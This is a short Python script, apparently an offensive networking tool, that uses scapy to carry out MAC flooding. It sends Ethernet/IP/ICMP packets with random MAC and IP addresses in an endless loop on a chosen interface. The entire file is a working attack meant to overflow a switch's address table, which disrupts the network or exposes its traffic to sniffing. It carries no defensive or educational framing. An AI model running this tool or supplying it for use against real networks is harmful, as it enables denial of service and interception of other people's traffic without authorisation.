#File: mac_flooder.py
#Author: Mercury
#Function: A simple script to carry out MAC flooding

#Importing the necessary libraries
import sys
from scapy.all import *

#Defining the interface, modify as you please
interface = 'eth0'

#Setting up random MACs and IP addresses
packet = Ether(src=RandMAC(), dst=RandMAC()) / \
    IP(src=RandIP(), dst=RandIP()) / \
    ICMP()
try:
    while True:
        sendp(packet, iface=interface)
except KeyboardInterrupt:
    print("\nExiting...")
	sys.exit(0)
